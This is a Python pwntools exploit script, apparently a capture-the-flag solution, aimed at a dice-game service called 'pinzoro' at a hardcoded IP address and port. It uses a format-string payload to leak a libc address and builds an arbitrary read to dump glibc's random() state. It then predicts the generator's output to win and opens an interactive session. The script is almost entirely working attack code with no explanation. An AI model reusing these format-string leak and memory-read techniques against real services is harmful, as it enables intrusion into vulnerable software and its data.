from pwn import *
	
TARGET = './pinzoro'
HOST = '27.133.155.191'
PORT = 30000

# elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(["./ld-2.31.so", TARGET], env={"LD_PRELOAD":"./libc.so.6"})
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $_base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))




def aar(addr):
	r.sendlineafter(': ', '1')
	r.sendlineafter(': ', '%c'*6+'%s@@'+p64(addr))



while(1):
	r = start()
	r.sendlineafter(': ', '1')
	r.sendlineafter(': ', 'A'*8+'%p|'*28)
	r.recvuntil('A'*8)
	leak = int(r.recvuntil('| DICE', True).split('|')[-1], 16)
	# dbg('leak')
	base = leak - 0x270b3
	# dbg('base')

	rand_ctx = base + 0x1eb740
	rand_args = base + 0x1eb1c4
	# dbg('rand_ctx')
	# dbg('rand_args')

	aar(rand_args)
	r.recvuntil('ROLLING ')
	r.recv(6)
	leak = r.recvuntil('DICES', True)
	leak = leak[:-10]
	if len(leak) != 0x7c:
		r.close()
	else:
		break

# context.log_level = 'debug'
	
if args.D:
	debug(r, [])
print hexdump(leak)
dbg('base')
dbg('rand_args')


def get_roll_count(dump):
	fptr = 0xc
	rptr = 0
	endptr = 0x7c
	stream = dump
	burst = 0
	count = 0

	while(1):
		res, stream, fptr, rptr, endptr = next_rand(stream, fptr, rptr, endptr)
		count += 1
		if res % 6 == 0:
			burst += 1
			if burst == 8: 
				break
		else:
			burst = 0

	return count - burst

def next_rand(stream, fptr, rptr, endptr):
	val = (u32(stream[fptr:fptr+4])+u32(stream[rptr:rptr+4])) &0xffffffff

	new_stream = stream[:fptr] + p32(val) + stream[fptr+4:]
	res = val >> 1

	fptr += 4
	rptr += 4
	if fptr >= endptr:
		fptr = 0
	if rptr >= endptr:
		rptr = 0

	# print "debug:", hex(res), fptr, rptr
	return res, new_stream, fptr, rptr, endptr
	

n = get_roll_count(leak)
print "answer:", n
r.sendlineafter(': ', '1')
r.sendlineafter(': ', str(n))

r.sendlineafter(': ', '2')

r.interactive()
r.close()
